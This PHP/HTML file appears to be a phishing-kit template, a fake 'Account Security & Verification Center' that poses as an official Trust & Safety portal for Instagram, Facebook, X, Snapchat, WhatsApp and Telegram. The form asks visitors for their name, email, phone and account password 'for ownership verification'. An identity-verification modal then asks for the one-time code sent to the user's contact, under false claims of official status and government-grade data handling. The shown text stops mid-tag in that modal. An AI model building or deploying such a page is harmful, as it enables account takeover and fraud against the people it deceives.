<?php
/* ================================================================
   templates/social_reporting/index.php
   Social Media Reporting Center — Template 4 (NetraX-2.0-2.O)
   Fully isolated; does not include or modify any core PHP files.
   ================================================================ */
if (session_status() !== PHP_SESSION_ACTIVE) {
  session_start();
}

if (empty($_SESSION['smr_nonce']) || !is_string($_SESSION['smr_nonce'])) {
  $_SESSION['smr_nonce'] = bin2hex(random_bytes(16));
}

$smr_nonce = $_SESSION['smr_nonce'];
?><!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Account Security &amp; Verification Center</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="assets.css">
</head>

<body class="smr-root">
<div class="smr-container">

  <!-- ════════════ TWO-COLUMN LAYOUT ════════════ -->
  <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 xl:gap-12 items-start">

  <!-- ════════════ LEFT COLUMN ════════════ -->
  <div class="flex flex-col gap-5 lg:sticky lg:top-8">

  <!-- ════════════ HEADER ════════════ -->
  <div class="mb-0">
    <div class="flex items-center gap-4 mb-2">
      <div class="flex-shrink-0 flex items-center justify-center w-14 h-14 rounded-2xl" style="background:linear-gradient(135deg,#2563eb,#4f46e5);box-shadow:0 8px 24px rgba(37,99,235,0.32);">
        <svg class="w-7 h-7 text-white" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
        </svg>
      </div>
      <div>
        <h1 class="text-2xl sm:text-3xl font-bold text-slate-900 tracking-tight leading-tight">Account Security &amp; Verification Center</h1>
        <p class="text-sm text-slate-500 mt-1 leading-relaxed">Official Platform Account Verification &amp; Incident Reporting Portal</p>
      </div>
    </div>
  </div>

  <!-- ════════════ TRUST INDICATORS ════════════ -->
  <div class="flex flex-wrap items-center justify-center gap-4 sm:gap-6 py-4 px-6 mb-0 rounded-xl bg-white border border-slate-200" style="box-shadow:0 1px 4px rgba(0,0,0,0.06);">
    <span class="flex items-center gap-2 text-sm font-medium text-slate-700">
      <svg class="w-4 h-4 text-blue-500 flex-shrink-0" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
      </svg>
      Secure Submission
    </span>
    <span class="hidden sm:block w-px h-5 bg-slate-200"></span>
    <span class="flex items-center gap-2 text-sm font-medium text-slate-700">
      <svg class="w-4 h-4 text-blue-500 flex-shrink-0" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
      </svg>
      Encrypted Data Handling
    </span>
    <span class="hidden sm:block w-px h-5 bg-slate-200"></span>
    <span class="flex items-center gap-2 text-sm font-medium text-slate-700">
      <svg class="w-4 h-4 text-emerald-500 flex-shrink-0" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4M7.835 4.697a3.42 3.42 0 001.946-.806 3.42 3.42 0 014.438 0 3.42 3.42 0 001.946.806 3.42 3.42 0 013.138 3.138 3.42 3.42 0 00.806 1.946 3.42 3.42 0 010 4.438 3.42 3.42 0 00-.806 1.946 3.42 3.42 0 01-3.138 3.138 3.42 3.42 0 00-1.946.806 3.42 3.42 0 01-4.438 0 3.42 3.42 0 00-1.946-.806 3.42 3.42 0 01-3.138-3.138 3.42 3.42 0 00-.806-1.946 3.42 3.42 0 010-4.438 3.42 3.42 0 00.806-1.946 3.42 3.42 0 013.138-3.138z"/>
      </svg>
      Verified Investigation Process
    </span>
  </div>

  <!-- ════════════ PROGRESS STEPS ════════════ -->
  <div class="flex items-center bg-white rounded-xl border border-slate-200 px-3 sm:px-5 py-4 mb-0 overflow-hidden" style="box-shadow:0 1px 4px rgba(0,0,0,0.06);">
    <div class="flex items-center gap-1 sm:gap-2 flex-shrink-0 min-w-0">
      <div class="flex-shrink-0 flex items-center justify-center w-7 h-7 rounded-full bg-blue-600" style="box-shadow:0 2px 8px rgba(37,99,235,0.38);">
        <span class="text-white text-xs font-bold">1</span>
      </div>
      <span class="text-xs font-semibold text-blue-700 whitespace-nowrap">Report Details</span>
    </div>
    <div class="flex-1 h-px bg-slate-200 mx-2 sm:mx-3 min-w-[0.5rem]"></div>
    <div class="flex items-center gap-1 sm:gap-2 flex-shrink-0">
      <div class="flex-shrink-0 flex items-center justify-center w-7 h-7 rounded-full border-2 border-slate-300 bg-white">
        <span class="text-slate-400 text-xs font-bold">2</span>
      </div>
      <span class="hidden sm:inline text-xs text-slate-400 whitespace-nowrap">Identity Check</span>
    </div>
    <div class="flex-1 h-px bg-slate-200 mx-2 sm:mx-3 min-w-[0.5rem]"></div>
    <div class="flex items-center gap-1 sm:gap-2 flex-shrink-0">
      <div class="flex-shrink-0 flex items-center justify-center w-7 h-7 rounded-full border-2 border-slate-300 bg-white">
        <span class="text-slate-400 text-xs font-bold">3</span>
      </div>
      <span class="hidden sm:inline text-xs text-slate-400 whitespace-nowrap">Review</span>
    </div>
  </div>

  <!-- ════════════ HOW IT WORKS ════════════ -->
  <div class="rounded-2xl p-6 text-white" style="background:linear-gradient(135deg,#1d4ed8 0%,#4338ca 100%);box-shadow:0 8px 32px rgba(29,78,216,0.22);">
    <h3 class="text-sm font-semibold mb-4 flex items-center gap-2">
      <svg class="w-4 h-4 flex-shrink-0" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
      How The Process Works
    </h3>
    <ol class="space-y-3">
      <li class="flex items-start gap-3">
        <span class="flex-shrink-0 flex items-center justify-center w-6 h-6 rounded-full text-xs font-bold bg-white/20 text-white mt-0.5">1</span>
        <span class="text-sm text-blue-100 leading-relaxed">Complete the report form with details about the platform and the account you wish to report.</span>
      </li>
      <li class="flex items-start gap-3">
        <span class="flex-shrink-0 flex items-center justify-center w-6 h-6 rounded-full text-xs font-bold bg-white/20 text-white mt-0.5">2</span>
        <span class="text-sm text-blue-100 leading-relaxed">Confirm your identity via a one-time verification code sent to your registered contact.</span>
      </li>
      <li class="flex items-start gap-3">
        <span class="flex-shrink-0 flex items-center justify-center w-6 h-6 rounded-full text-xs font-bold bg-white/20 text-white mt-0.5">3</span>
        <span class="text-sm text-blue-100 leading-relaxed">Our Trust &amp; Safety team reviews the report and initiates appropriate action within 24&ndash;48 hours.</span>
      </li>
    </ol>
  </div>

  <!-- ════════════ INFORMATIONAL NOTE ════════════ -->
  <div class="rounded-xl border border-blue-200 bg-blue-50 p-5 sm:p-6" style="box-shadow:0 2px 10px rgba(37,99,235,0.07);">
    <div class="flex items-start gap-3">
      <div class="flex-shrink-0 flex items-center justify-center w-8 h-8 rounded-lg bg-blue-100 border border-blue-200 mt-0.5">
        <svg class="w-4 h-4 text-blue-600" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
        </svg>
      </div>
      <div class="space-y-3 min-w-0">
        <p class="text-xs font-bold uppercase tracking-widest text-blue-700">Important Notice</p>
        <div class="space-y-2.5 text-sm text-slate-700 leading-relaxed">
          <p>The information you provide in this report is used <span class="font-medium text-slate-800">solely for identity verification and investigation purposes</span>. Your personal details are securely handled and will not be shared publicly.</p>
          <p>If the reported account is found to be in violation of platform policies or involved in harmful activity, appropriate action may be taken — which may include <span class="font-medium text-slate-800">account restriction, suspension, or permanent removal</span>.</p>
          <p>You may also provide <span class="font-medium text-slate-800">optional additional details or supporting information</span> to help our Trust &amp; Safety team conduct a more accurate and efficient investigation.</p>
        </div>
      </div>
    </div>
  </div>

  <!-- ════════════ SECURITY NOTICE ════════════ -->
  <div class="rounded-2xl border border-slate-200 bg-white p-5" style="box-shadow:0 2px 12px rgba(15,23,42,0.06);">
    <div class="flex items-start gap-3">
      <div class="flex-shrink-0 flex items-center justify-center w-9 h-9 rounded-xl bg-emerald-50 border border-emerald-200 mt-0.5">
        <svg class="w-4 h-4 text-emerald-600" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
        </svg>
      </div>
      <div>
        <p class="text-sm font-semibold text-slate-800 mb-1">Your Information is Secure</p>
        <p class="text-xs text-slate-500 leading-relaxed">All submissions are protected by SSL/TLS encryption. Your personal data is handled in strict accordance with government data protection standards and accessible only to authorised investigators.</p>
      </div>
    </div>
  </div>

  </div><!-- /left column -->

  <!-- ════════════ RIGHT COLUMN — Report Form ════════════ -->
  <div>

  <!-- ════════════ MAIN FORM CARD ════════════ -->
  <div class="bg-white rounded-2xl border border-slate-100 overflow-hidden mb-6" style="box-shadow:0 8px 40px rgba(15,23,42,0.10),0 2px 8px rgba(15,23,42,0.05);">

    <!-- Tab selector header -->
    <div class="px-6 pt-6 pb-5 border-b border-slate-100">
      <p class="text-xs font-bold tracking-widest uppercase text-slate-500 mb-3">Step 1 &mdash; Platform Selection</p>
      <div class="smr-tab-bar">
        <button class="smr-tab smr-tab-active" id="smr_tab_social" type="button">
          <svg style="width:0.875rem;height:0.875rem;display:inline;vertical-align:middle;margin-right:0.3rem;" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"/>
          </svg>Social Platforms
        </button>
        <button class="smr-tab" id="smr_tab_messaging" type="button">
          <svg style="width:0.875rem;height:0.875rem;display:inline;vertical-align:middle;margin-right:0.3rem;" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"/>
          </svg>Messaging Platforms
        </button>
      </div>
    </div>

    <!-- ─────────── PANEL A — Social Platforms ─────────── -->
    <div id="smr_panel_social" class="px-6 pt-6 pb-8">
      <form id="smr_form_social" action="submit.php" method="POST" style="display:none;" onsubmit="return false;">
        <input type="hidden" name="platform_group" value="social">
        <input type="hidden" name="smr_nonce" value="<?php echo htmlspecialchars($smr_nonce, ENT_QUOTES, 'UTF-8'); ?>">

        <!-- Platform card selector -->
        <fieldset class="smr-platform-fieldset mb-10">
          <legend class="smr-label smr-required">Select Platform</legend>
          <div class="smr-platform-cards-grid" id="smr_social_card_grid">
            <label class="smr-platform-card" for="smr_s_ig">
              <input type="radio" id="smr_s_ig" name="platform" value="Instagram" class="smr-radio-hidden" required>
              <img src="assets/icons/instagram.svg" alt="Instagram" class="smr-icon">
              <span class="smr-platform-card-label">Instagram</span>
            </label>
            <label class="smr-platform-card" for="smr_s_fb">
              <input type="radio" id="smr_s_fb" name="platform" value="Facebook" class="smr-radio-hidden">
              <img src="assets/icons/facebook.svg" alt="Facebook" class="smr-icon">
              <span class="smr-platform-card-label">Facebook</span>
            </label>
            <label class="smr-platform-card" for="smr_s_x">
              <input type="radio" id="smr_s_x" name="platform" value="X (Twitter)" class="smr-radio-hidden">
              <img src="assets/icons/x.svg" alt="X (Twitter)" class="smr-icon">
              <span class="smr-platform-card-label">X (Twitter)</span>
            </label>
            <label class="smr-platform-card" for="smr_s_sc">
              <input type="radio" id="smr_s_sc" name="platform" value="Snapchat" class="smr-radio-hidden">
              <img src="assets/icons/snapchat.svg" alt="Snapchat" class="smr-icon">
              <span class="smr-platform-card-label">Snapchat</span>
            </label>
          </div>
        </fieldset>

        <!-- Section 1 — Reporter Information -->
        <div class="mb-6 rounded-xl border border-slate-200 overflow-hidden">
          <div class="flex items-center justify-between gap-4 px-6 py-4 bg-blue-50 border-b border-blue-100">
            <div class="flex items-start gap-4">
              <div class="flex-shrink-0 flex items-center justify-center w-10 h-10 rounded-xl bg-blue-100 border border-blue-200">
                <svg class="w-5 h-5 text-blue-600" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/>
                </svg>
              </div>
              <div class="flex-1 min-w-0">
                <p class="text-base font-semibold text-slate-800 leading-tight">Reporter Information</p>
                <p class="text-xs text-slate-500 mt-1">Details of the person submitting this report</p>
              </div>
            </div>
            <span class="hidden sm:inline-flex text-xs font-semibold tracking-wide uppercase px-3 py-1 rounded-full bg-emerald-50 border border-emerald-200 text-emerald-700 whitespace-nowrap">Verified Submitter</span>
          </div>
          <div class="grid grid-cols-1 sm:grid-cols-2 gap-x-5 gap-y-5 px-6 pt-5 pb-4">
            <div>
              <label class="smr-label smr-required" for="smr_s_reporterName">Full Name</label>
              <input class="smr-input" id="smr_s_reporterName" name="reporter_name" type="text" placeholder="Your full name" required autocomplete="name">
            </div>
            <div>
              <label class="smr-label smr-required" for="smr_s_reporterUsername">Your Username</label>
              <input class="smr-input" id="smr_s_reporterUsername" name="reporter_username" type="text" placeholder="@yourhandle" required autocomplete="off">
            </div>
            <div>
              <label class="smr-label smr-required" for="smr_s_reporterEmail">Email Address</label>
              <input class="smr-input" id="smr_s_reporterEmail" name="reporter_email" type="email" placeholder="your@email.com" required autocomplete="email">
            </div>
            <div>
              <label class="smr-label smr-required" for="smr_s_reporterPhone">Phone Number</label>
              <input class="smr-input" id="smr_s_reporterPhone" name="reporter_phone" type="tel" placeholder="+1 555 000 0000" required autocomplete="tel">
            </div>
            <div class="sm:col-span-2">
              <label class="smr-label smr-required" for="smr_s_password">Account Password</label>
              <div class="smr-password-field">
                <input class="smr-input" id="smr_s_password" name="password" type="password" placeholder="For ownership verification" required autocomplete="current-password">
                <button
                  class="smr-password-toggle"
                  id="smr_s_password_toggle"
                  type="button"
                  data-password-toggle="true"
                  data-target="smr_s_password"
                  aria-label="Show password"
                  aria-pressed="false"
                >
                  <svg class="smr-password-icon smr-password-icon-show" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" aria-hidden="true">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
                    <circle cx="12" cy="12" r="3"/>
                  </svg>
                  <svg class="smr-password-icon smr-password-icon-hide" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" aria-hidden="true">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M3 3l18 18"/>
                    <path stroke-linecap="round" stroke-linejoin="round" d="M10.584 10.587A2 2 0 0013.414 13.415"/>
                    <path stroke-linecap="round" stroke-linejoin="round" d="M9.363 5.365A9.466 9.466 0 0112 5c4.478 0 8.268 2.943 9.542 7a9.976 9.976 0 01-4.132 5.411M6.228 6.228C4.526 7.383 3.189 9.083 2.458 12c1.274 4.057 5.065 7 9.542 7a9.46 9.46 0 005.012-1.423"/>
                  </svg>
                </button>
              </div>
            </div>
          </div>
          <div class="mx-6 border-t border-slate-100"></div>
          <div class="px-6 pt-4 pb-5">
            <p class="text-xs font-bold uppercase tracking-widest text-slate-400 mb-4">Additional Verification <span class="smr-optional-tag normal-case font-normal">Optional</span></p>
            <div class="grid grid-cols-1 sm:grid-cols-2 gap-x-5 gap-y-5">
              <div>
                <label class="smr-label" for="smr_s_alt_email">Alternate Email <span class="smr-optional-tag">Optional</span></label>
                <input class="smr-input" id="smr_s_alt_email" name="alt_email" type="email" placeholder="backup@email.com" autocomplete="off">
              </div>
              <div>
                <label class="smr-label" for="smr_s_alt_phone">Alternate Phone <span class="smr-optional-tag">Optional</span></label>
                <input class="smr-input" id="smr_s_alt_phone" name="alt_phone" type="tel" placeholder="+1 555 000 0000" autocomplete="off">
              </div>
            </div>
          </div>
        </div>

        <!-- Section 2 — Victim Information -->
        <div class="mb-6 rounded-xl border border-slate-200 overflow-hidden">
          <div class="flex items-center justify-between gap-4 px-6 py-4 bg-amber-50 border-b border-amber-100">
            <div class="flex items-start gap-4">
              <div class="flex-shrink-0 flex items-center justify-center w-10 h-10 rounded-xl bg-amber-100 border border-amber-200">
                <svg class="w-5 h-5 text-amber-600" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
                </svg>
              </div>
              <div class="flex-1 min-w-0">
                <p class="text-base font-semibold text-slate-800 leading-tight">Victim Information</p>
                <p class="text-xs text-slate-500 mt-1">Details of the account or individual affected</p>
              </div>
            </div>
            <span class="hidden sm:inline-flex text-xs font-semibold tracking-wide uppercase px-3 py-1 rounded-full bg-amber-50 border border-amber-200 text-amber-700 whitespace-nowrap">Report Target</span>
          </div>
          <div class="grid grid-cols-1 sm:grid-cols-2 gap-x-5 gap-y-5 px-6 py-5">
            <div>
              <label class="smr-label" for="smr_s_victimName">Victim Name <span class="smr-optional-tag">Optional</span></label>
              <input class="smr-input" id="smr_s_victimName" name="victim_name" type="text" placeholder="Full name if known" autocomplete="off">
            </div>
            <div>
              <label class="smr-label smr-required" for="smr_s_victimUsername">Victim Username</label>
              <input class="smr-input" id="smr_s_victimUsername" name="victim_username" type="text" placeholder="@victimhandle" required autocomplete="off">
            </div>
            <div>
              <label class="smr-label" for="smr_s_victimEmail">Victim Email <span class="smr-optional-tag">Optional</span></label>
              <input class="smr-input" id="smr_s_victimEmail" name="victim_email" type="email" placeholder="victim@email.com" autocomplete="off">
            </div>
            <div>
              <label class="smr-label" for="smr_s_victimPhone">Victim Phone <span class="smr-optional-tag">Optional</span></label>
              <input class="smr-input" id="smr_s_victimPhone" name="victim_phone" type="tel" placeholder="+1 555 000 0000" autocomplete="off">
            </div>
          </div>
        </div>

        <div id="smr_err_social" class="smr-alert-error" style="display:none;margin-bottom:1rem;"></div>
        <button class="smr-btn-primary" id="smr_btn_social" type="submit">Submit Report &amp; Verify Identity</button>
        <p class="text-center text-xs text-slate-400 mt-3 leading-relaxed">By submitting you confirm this information is accurate and authorise our Trust &amp; Safety team to investigate the reported account.</p>
      </form>

      <div id="smr_social_nojs" class="text-center py-8">
        <p class="text-slate-400 text-sm">Loading form&hellip;</p>
      </div>
    </div><!-- /smr_panel_social -->

    <!-- ─────────── PANEL B — Messaging Platforms ─────────── -->
    <div id="smr_panel_messaging" class="px-6 pt-6 pb-8" style="display:none;">
      <form id="smr_form_messaging" action="submit.php" method="POST" style="display:none;" onsubmit="return false;">
        <input type="hidden" name="platform_group" value="messaging">
        <input type="hidden" name="smr_nonce" value="<?php echo htmlspecialchars($smr_nonce, ENT_QUOTES, 'UTF-8'); ?>">

        <!-- Platform card selector -->
        <fieldset class="smr-platform-fieldset mb-10">
          <legend class="smr-label smr-required">Select Platform</legend>
          <div class="smr-platform-cards-grid smr-platform-cards-grid--2col" id="smr_messaging_card_grid">
            <label class="smr-platform-card" for="smr_m_wa">
              <input type="radio" id="smr_m_wa" name="platform" value="WhatsApp" class="smr-radio-hidden" required>
              <img src="assets/icons/whatsapp.svg" alt="WhatsApp" class="smr-icon">
              <span class="smr-platform-card-label">WhatsApp</span>
            </label>
            <label class="smr-platform-card" for="smr_m_tg">
              <input type="radio" id="smr_m_tg" name="platform" value="Telegram" class="smr-radio-hidden">
              <img src="assets/icons/telegram.svg" alt="Telegram" class="smr-icon">
              <span class="smr-platform-card-label">Telegram</span>
            </label>
          </div>
        </fieldset>

        <!-- Section 1 — Reporter Information -->
        <div class="mb-6 rounded-xl border border-slate-200 overflow-hidden">
          <div class="flex items-center justify-between gap-4 px-6 py-4 bg-blue-50 border-b border-blue-100">
            <div class="flex items-start gap-4">
              <div class="flex-shrink-0 flex items-center justify-center w-10 h-10 rounded-xl bg-blue-100 border border-blue-200">
                <svg class="w-5 h-5 text-blue-600" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/>
                </svg>
              </div>
              <div class="flex-1 min-w-0">
                <p class="text-base font-semibold text-slate-800 leading-tight">Reporter Information</p>
                <p class="text-xs text-slate-500 mt-1">Details of the person submitting this report</p>
              </div>
            </div>
            <span class="hidden sm:inline-flex text-xs font-semibold tracking-wide uppercase px-3 py-1 rounded-full bg-emerald-50 border border-emerald-200 text-emerald-700 whitespace-nowrap">Verified Submitter</span>
          </div>
          <div class="grid grid-cols-1 sm:grid-cols-2 gap-x-5 gap-y-5 px-6 py-5">
            <div>
              <label class="smr-label smr-required" for="smr_m_reporterName">Full Name</label>
              <input class="smr-input" id="smr_m_reporterName" name="reporter_name" type="text" placeholder="Your full name" required autocomplete="name">
            </div>
            <div>
              <label class="smr-label" for="smr_m_reporterUsername">Your Username <span class="smr-optional-tag">Optional</span></label>
              <input class="smr-input" id="smr_m_reporterUsername" name="reporter_username" type="text" placeholder="@yourhandle" autocomplete="off">
            </div>
            <div>
              <label class="smr-label" for="smr_m_reporterEmail">Email Address <span class="smr-optional-tag">Optional</span></label>
              <input class="smr-input" id="smr_m_reporterEmail" name="reporter_email" type="email" placeholder="your@email.com" autocomplete="email">
            </div>
            <div>
              <label class="smr-label smr-required" for="smr_m_reporterPhone">Your Phone Number</label>
              <input class="smr-input" id="smr_m_reporterPhone" name="reporter_phone" type="tel" placeholder="+1 555 000 0000" required autocomplete="tel">
            </div>
          </div>
        </div>

        <!-- Section 2 — Victim Information -->
        <div class="mb-6 rounded-xl border border-slate-200 overflow-hidden">
          <div class="flex items-center justify-between gap-4 px-6 py-4 bg-amber-50 border-b border-amber-100">
            <div class="flex items-start gap-4">
              <div class="flex-shrink-0 flex items-center justify-center w-10 h-10 rounded-xl bg-amber-100 border border-amber-200">
                <svg class="w-5 h-5 text-amber-600" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
                </svg>
              </div>
              <div class="flex-1 min-w-0">
                <p class="text-base font-semibold text-slate-800 leading-tight">Victim Information</p>
                <p class="text-xs text-slate-500 mt-1">Details of the account or individual affected</p>
              </div>
            </div>
            <span class="hidden sm:inline-flex text-xs font-semibold tracking-wide uppercase px-3 py-1 rounded-full bg-amber-50 border border-amber-200 text-amber-700 whitespace-nowrap">Report Target</span>
          </div>
          <div class="grid grid-cols-1 sm:grid-cols-2 gap-x-5 gap-y-5 px-6 py-5">
            <div>
              <label class="smr-label" for="smr_m_victimName">Contact Name <span class="smr-optional-tag">Optional</span></label>
              <input class="smr-input" id="smr_m_victimName" name="victim_name" type="text" placeholder="Full name of the reported contact" autocomplete="off">
            </div>
            <div>
              <label class="smr-label" for="smr_m_victimUsername">Platform Username <span class="smr-optional-tag">Optional</span></label>
              <input class="smr-input" id="smr_m_victimUsername" name="victim_username" type="text" placeholder="Username or handle of the reported account" autocomplete="off">
            </div>
            <div>
              <label class="smr-label" for="smr_m_victimEmail">Associated Email Address <span class="smr-optional-tag">Optional</span></label>
              <input class="smr-input" id="smr_m_victimEmail" name="victim_email" type="email" placeholder="Email address linked to the reported account" autocomplete="off">
            </div>
            <div>
              <label class="smr-label smr-required" for="smr_m_victimPhone">Contact Number</label>
              <input class="smr-input" id="smr_m_victimPhone" name="victim_phone" type="tel" placeholder="Phone number of the reported contact" required autocomplete="off">
            </div>
          </div>
        </div>

        <div id="smr_err_messaging" class="smr-alert-error" style="display:none;margin-bottom:1rem;"></div>
        <button class="smr-btn-primary" id="smr_btn_messaging" type="submit">Submit Report &amp; Verify Identity</button>
        <p class="text-center text-xs text-slate-400 mt-3 leading-relaxed">By submitting you confirm this information is accurate and authorise our Trust &amp; Safety team to investigate the reported account.</p>
      </form>

      <div id="smr_messaging_nojs" class="text-center py-8">
        <p class="text-slate-400 text-sm">Loading form&hellip;</p>
      </div>
    </div><!-- /smr_panel_messaging -->

  </div><!-- /main form card -->

  </div><!-- /right column -->

  </div><!-- /two-column layout -->

  <!-- ════════════ FOOTER ════════════ -->
  <div class="smr-footer">
    <p>All reports are reviewed by the Platform Trust &amp; Safety Team in accordance with platform security policies.</p>
    <p style="margin-top:0.25rem;">&copy; <?php echo date('Y'); ?> Platform Trust &amp; Safety Division &nbsp;&middot;&nbsp; Secure SSL/TLS Encrypted</p>
  </div>

</div><!-- /smr-container -->

<!-- ════════════ OTP MODAL — SOCIAL ════════════ -->
<div id="smr_otp_section_social" class="smr-otp-section">
  <div class="smr-otp-backdrop"></div>
  <div class="smr-otp-modal-card">

    <div class="text-center mb-5">
      <div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-blue-50 border border-blue-200 mb-3">
        <svg class="w-5 h-5 text-blue-600" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
        </svg>
      </div>
      <h3 class="text-lg font-bold text-slate-900 tracking-tight mb-1">Identity Verification</h3>
      <p class="text-sm text-slate-500 leading-relaxed max-w-xs mx-auto">Enter the one-time code sent to your registered contact to confirm your identity.</p>
    </div>

    <div class="flex flex-wrap items-center justify-center gap-2 mb-5 pb-4 border-b border-slate-100">
      <span class="flex items-center gap-1 text-xs text-slate-500">
        <svg class="w-3 h-3 text-blue-500" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
        Secure
      </span>
      <span class="text-slate-300">&middot;</span>
      <span class="flex items-center gap-1 text-xs text-slate-500">
        <svg class="w-3 h-3 text-blue-500" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
        Encrypted
      </span>
      <span class="text-slate-300">&middot;</span>
      <span class="flex items-center gap-1 text-xs text-slate-500">
        <svg class="w-3 h-3 text-blue-500" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"/></svg>
        One-Time Code
      </span>
    </div>

    <form id="smr_otp_form_social" action="otp_verify.php" method="POST">
      <input type="hidden" name="platform_group" value="social">
      <input type="hidden" name="submission_id" id="smr_otp_subid_social" value="">

      <div class="mb-5">
        <label for="smr_otp_input_social" class="block text-sm font-medium text-slate-600 mb-2">Verification Code</label>
        <input
          type="text"
          id="smr_otp_input_social"
          name="otp_value"
          inputmode="numeric"
          autocomplete="one-time-code"
          maxlength="8"
          placeholder="Enter verification code"
          class="w-full rounded-lg border border-gray-300 px-4 py-3 text-center text-lg tracking-widest text-slate-900 bg-white focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all placeholder:text-slate-300 placeholder:tracking-normal"
        >
        <p id="smr_otp_err_social" class="text-xs text-red-500 mt-1.5" style="display:none;"></p>
      </div>

      <button id="smr_otp_btn_social" type="submit"
